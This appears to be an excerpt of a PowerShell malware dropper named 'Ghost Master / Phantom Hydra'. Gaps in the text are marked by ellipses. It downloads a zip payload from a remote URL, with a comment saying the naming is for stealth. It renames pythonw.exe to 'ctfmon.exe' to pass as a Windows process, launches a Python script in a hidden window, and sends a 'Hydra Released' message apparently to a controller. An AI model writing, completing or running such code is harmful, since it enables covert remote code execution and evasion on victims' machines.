# --- THE GHOST MASTER (VERSION 6.4 - PHANTOM HYDRA) ---
...
# 3. THE "LUNGS" FIX (Refined)
# Instead of deleting, we append 'import site' to the ._pth file so it finds site-packages correctly
...
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip" # Directly save as zip for stealth
...
# 5. ACTIVATION & RESURRECTION (Fixed Quoting)
if (Test-Path "$Path\python\pythonw.exe") {
    Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
    
    # Using specific argument array to avoid Invoke-Expression quoting issues
    ...
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Released. Resurrection Active."
}
